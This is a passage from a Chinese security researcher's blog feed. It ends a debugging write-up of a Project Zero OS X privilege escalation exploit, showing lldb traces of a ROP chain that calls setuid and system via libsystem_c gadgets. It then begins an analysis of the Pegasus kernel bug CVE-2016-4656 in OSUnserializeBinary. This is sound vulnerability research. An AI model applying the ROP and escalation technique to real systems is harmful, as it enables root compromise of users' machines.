<span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea40</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea50</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea60</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea70</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea80</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea90</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523deaa0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x7fff523decb0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decc0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decd0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dece0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decf0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br></pre></td></tr></table></figure>
<p>执行<code>0x7fff8fed1cec</code>处开始的<code>gad_get</code>之后，就会修改<code>rsp</code>,并通过<code>ret</code>指令，跳转到具体的<code>payload</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br></pre></td></tr></table></figure>
<p>执行的流程大致如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;    0x7fff8fed1d09 &#60;+1964&#62;: jmp    0x7fff8fed1734            ; &#60;+471&#62;&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85&#10;libsystem_c.dylib`strcpy:&#10;-&#62;  0x7fff8fe520d5 &#60;+85&#62;: ret&#10;    0x7fff8fe520d6 &#60;+86&#62;: movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;: movdqu xmmword ptr [rdi], xmm0&#10;    0x7fff8fe520df &#60;+95&#62;: mov    rax, rdi</span><br></pre></td></tr></table></figure>
<p>可以看到，最后一个执行的 是<code>0x7fff8fe520d5</code>处的<code>ret</code>。</p>
<p>观察寄存器可以发现$rip=<code>0x00007fff8fe520d5</code>,$rsp=<code>0x00007fff523dea18</code>。而栈已经变成了这样了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 100  0x00007fff523dea18&#10;0x7fff523dea18: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea28: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea38: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea48: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea58: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea68: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea78: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea88: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea98: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>继续执行代码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116&#10;libsystem_c.dylib`addr2ascii:&#10;-&#62;  0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0&#10;    0x7fff8fe8a217 &#60;+120&#62;: mov    rax, rbx</span><br></pre></td></tr></table></figure>
<p>执行了我们的第一个<code>ROP</code>的 <code>gad_get</code>。这个时候再观察我们的函数栈</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 30  $rsp-0x20&#10;0x7fff523def50: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523def60: 0x00007fff8fe520d5 0x00007fff8fe8a213&#10;0x7fff523def70: 0x0000000000000000 0x00007fff8a183628&#10;0x7fff523def80: 0x00007fff8fe8a213 0x00007fff8fedb69e&#10;0x7fff523def90: 0x00007fff8fed0e0b 0x0000000000000000&#10;0x7fff523defa0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defb0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defc0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defd0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defe0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523deff0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df000: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df010: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df020: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>就是我们构造的栈。</p>
<p>继续执行，也确实会看到相应的函数被执行。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8a183628 libsystem_kernel.dylib`setuid, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8a183628 libsystem_kernel.dylib`setuid&#10;libsystem_kernel.dylib`setuid:&#10;-&#62;  0x7fff8a183628 &#60;+0&#62;:  mov    eax, 0x2000017&#10;    0x7fff8a18362d &#60;+5&#62;:  mov    r10, rcx&#10;    0x7fff8a183630 &#60;+8&#62;:  syscall&#10;    0x7fff8a183632 &#60;+10&#62;: jae    0x7fff8a18363c            ; &#60;+20&#62;&#10;   ...&#30465;&#30053;n&#27493;...&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed0e0b libsystem_c.dylib`system, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed0e0b libsystem_c.dylib`system&#10;libsystem_c.dylib`system:</span><br></pre></td></tr></table></figure>
<p>到此，<code>exploit</code>最基本的逻辑算是理清楚了。</p>
<h1 id="0x04_关于阻塞子进程">0x04 关于阻塞子进程</h1><p>​    阻塞子进程的技巧所要达到的目的就是，让子进程调用<code>execve</code>函数之后，内核中执行完<code>task_t</code>相关数据修改后因为<code>Pipe</code>阻塞的并且已经满了，所以不会立即开始执行<code>traceroute6</code>的<code>main</code>函数。这样就给父进程做内存改写的时间窗口。</p>
<h1 id="0x05_小结">0x05 小结</h1><p>​    分析到这里，只是初步了解了<code>exploit</code>的原理，对整个漏洞的分析才刚刚开始，有更多值得挖掘和思考的地方。这篇文章仅仅希望能够帮助大家解决研究<code>OS X</code>内核漏洞的一些最基础的问题和小技巧。如果有不足之处还希望大家指出：）</p>
<h1 id="reference">reference</h1><p>1.<a href="http://lldb.llvm.org/lldb-gdb.html" target="_blank" rel="external">The LLDB Debugger</a></p>
<p>2.<a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p>3.<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">How to boot into OS X Recovery Mode on Parallels Desktop</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前两天<a href="https://googleprojectzero.blogspot.com/">Project Zero</a>的blog上面，Ian Beer发表了一篇新的文章，讨论了在<code>xnu</code> 的内核在设计上存在的一个问题，从而可以导致提权，沙箱逃逸等一洗了的问题。并且提供了相应的的POC与EXP源码。这篇文章是调试与分析其中第一个漏洞的部分记录。</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id">OS X/iOS kernel use-after-free in IOSurface</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4656分析与调试]]></title>
    <link href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://turingh.github.io/2016/09/07/CVE-2016-4656分析与调试/</id>
    <published>2016-09-07T20:48:47.000Z</published>
    <updated>2016-09-07T22:20:09.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> <a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a></p>
<p>关心<code>IOS</code>安全的技术人员最近一定都关注了这一次的安全事件，不需要多做描述了，想了解具体细节的可以自行<code>google</code>。</p>
<p>本文内容</p>
<ul>
<li>了漏洞所在的函数<code>OSUnserializeBinary</code>，了解其二进制格式</li>
<li>理解<code>POC</code>，分析<code>POC</code>执行的流程</li>
</ul>
<p>具体的技术背景，可以参考下面这篇文章</p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC）</a></p>
<a id="more"></a>
<h1 id="0x01_OSUnserializeBinary">0x01 OSUnserializeBinary</h1><p>在软件开发的流程中，在两个模块进行通信时，都会遇到使用<code>序列化</code>和<code>反序列化</code>传递一些数据结构，或者内部数据，比较典型的就是<code>google</code>的<code>protobuf</code>。</p>
<p>在<code>XNU</code>内核之中，自己实现了一套<code>C++</code>的子集，为<code>IOKIT</code>的开发提供支持，其中就提供了一套自己的序列化与反序列化的逻辑。</p>
<p>这次出现问题的<code>OSUnserializeBinary</code>便是这一个模块中的一个函数。</p>
<h2 id="1-1_OSUnserializeBinary">1.1 OSUnserializeBinary</h2><p>下面是对源码的简单分析。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	/*</span><br><span class="line">		...初始化变量</span><br><span class="line">	*/</span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">  </span><br><span class="line">  	// 等待反序列化的二进制数据存在一定的格式</span><br><span class="line">  </span><br><span class="line">	// 检测是否是是具有签名的内存数据</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// 跳过内存开始的签名部分，获取第一个需要解析的内存</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">  	// 反序列化流程中会使用到的一些状态变量</span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// 通过next指向的内容获取当前的key的pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// 检测是否分析完成</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// 获取当前的k</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //计算要用几个word</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//根据key的不同对不同的数据结构做操作</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		  	/*</span><br><span class="line">		  		...</span><br><span class="line">		  	*/</span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//退出循环</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//如果反序列化的结果不是一个reference</span><br><span class="line">		//就将结果存放到objsArray之中</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//如果ok的值为false，则退出反序列化循环</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	</span><br><span class="line">			//		kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//对解析出来的o进行不同的操作</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   /*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    /*...*/</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">      	//解析的流程中出现了一些新的容器</span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">      	//解析结束</span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_setAtIndex">1.2 setAtIndex</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> setAtIndex(v, idx, o)													\</span><br><span class="line">	<span class="keyword">if</span> (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + <span class="number">64</span>;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		<span class="keyword">if</span> (!nbuf) ok = false;													\</span><br><span class="line">		<span class="keyword">if</span> (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, 